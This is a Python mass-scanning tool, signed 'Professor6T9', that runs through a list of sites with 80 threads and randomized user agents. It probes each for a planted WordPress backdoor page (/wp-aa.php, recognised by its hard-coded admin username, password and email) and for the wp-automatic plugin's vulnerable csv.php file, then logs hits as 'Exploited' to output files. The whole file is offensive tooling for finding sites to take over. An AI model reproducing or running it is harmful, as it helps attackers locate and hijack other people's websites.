# -*- coding: utf-8 -*-
import sys, requests, re, random, string
import colorama
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, init, Style

init(autoreset=True)

fr = Fore.RED
fg = Fore.GREEN
fy = Fore.YELLOW
fc = Fore.CYAN
fk = Fore.WHITE
ft = Fore.MAGENTA

colorama.init(autoreset=True)
logo = f"""{Fore.YELLOW}
Coded By Professor6T9
                              
{Style.RESET_ALL}
"""

print(logo)

requests.packages.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r', encoding='utf-8', errors='ignore').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Usage: python ' + path[-1] + ' <sites.txt>')

def ran(length):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

Pathlist1 = ["/wp-aa.php"]
Pathlist2 = ['/wp-content/plugins/wp-automatic/inc/csv.php']

class TAF_EXP:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {'User-Agent': self.get_random_user_agent()}

    def get_random_user_agent(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
        ]
        return random.choice(user_agents)

    def URLdomain(self, site):
        if site.startswith("http://"):
            site = site.replace("http://", "")
        elif site.startswith("https://"):
            site = site.replace("https://", "")
        pattern = re.compile('(.*)/')
        while re.findall(pattern, site):
            sitez = re.findall(pattern, site)
            site = sitez[0]
        return site

    def checking_section1(self, site):
        url = "http://" + self.URLdomain(site)
        for Path in Pathlist1:
            response = self.session.get(url + Path, headers=self.headers, verify=False, timeout=30)
            if response.status_code == 200:
                content = response.text
                if ('<title>Add WordPress Admin</title>' in content and 
                    'input type="text" value="Support" name="user_name"' in content and 
                    'input type="text" value="vFELLmUMgJJdQW4S" name="pwd"> ' in content and 
                    'input type="text" value="support@wordpress.org" name="email"' in content and 
                    'input type="submit"' in content):
                    print(fg + f'[Exploited:=>] {url} -->{Fore.RESET}[Exploit Successfully (EXP-1)]')
                    with open('Exploit-Successfully1.txt', 'a') as f:
                        f.write(url +  "\n")
                    break
                else:
                    print(fr + f'[Failed:=>] {url} --> [Not Vuln]')

    def checking_section2(self, site):
        url = "http://" + self.URLdomain(site)
        for Path in Pathlist2:
            response = self.session.get(url + Path, headers=self.headers, verify=False, timeout=30)
            if 'login required' in response.text:
                print(fg + f'[Exploited:=>] {url} -->{Fore.YELLOW} [Exploit Successfully (EXP-2)]')
                with open('Exploit-Successfully2.txt', 'a') as f:
                    f.write(url + "\n")
                break
            else:
                print(fr + f'[Failed:=>] {url} --> [Not Vuln]')


def Professor6T9(site):
    control = TAF_EXP()
    try:
        control.checking_section1(site)
    except requests.exceptions.ConnectionError as e:
        # Extract the base URL (domain) without the path
        domain = control.URLdomain(site)
        print(fr + f'[Connection Error:=>] {domain} --> Connection aborted by the remote host')
    except Exception as e:
        print(fr + f'[Unexpected Error:=>] {site} --> {e}')

    try:
        control.checking_section2(site)
    except requests.exceptions.ConnectionError as e:
        # Extract the base URL (domain) without the path
        domain = control.URLdomain(site)
        print(fr + f'[Connection Error:=>] {domain} --> Connection aborted by the remote host')
    except Exception as e:
        print(fr + f'[Unexpected Error:=>] {site} --> {e}')

if __name__ == "__main__":
    mp = ThreadPool(80)
    mp.map(Professor6T9, target)
    mp.close()
    mp.join()
